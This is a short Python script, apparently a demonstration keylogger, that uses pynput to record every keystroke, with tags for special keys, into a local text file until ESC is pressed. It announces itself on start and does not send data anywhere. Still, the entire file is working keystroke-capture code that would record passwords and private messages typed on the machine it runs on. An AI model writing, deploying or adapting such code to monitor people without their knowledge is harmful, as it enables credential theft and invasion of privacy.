from pynput import keyboard
import os

# File to save the keystrokes
log_file = "qwertyone.txt"
print("🔐 Keylogger has started. Press ESC to stop.")
print("Saving log to:", os.path.abspath(log_file))

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        try:
            with open(log_file, "a") as f:
                if key == keyboard.Key.space:
                    f.write(" [SPACE] ")
                elif key == keyboard.Key.enter:
                    f.write(" [ENTER]\n")
                elif key == keyboard.Key.tab:
                    f.write(" [TAB] ")
                elif key == keyboard.Key.backspace:
                    f.write(" [BACKSPACE] ")
                elif key == keyboard.Key.esc:
                    f.write(" [ESC] ")
                else:
                    f.write(f" [{key}] ")
        except Exception as e:
            print("Special key write error:", e)
    except Exception as e:
        print("Character key write error:", e)

def on_release(key):
    if key == keyboard.Key.esc:
        print("🛑 Keylogger stopped.")
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
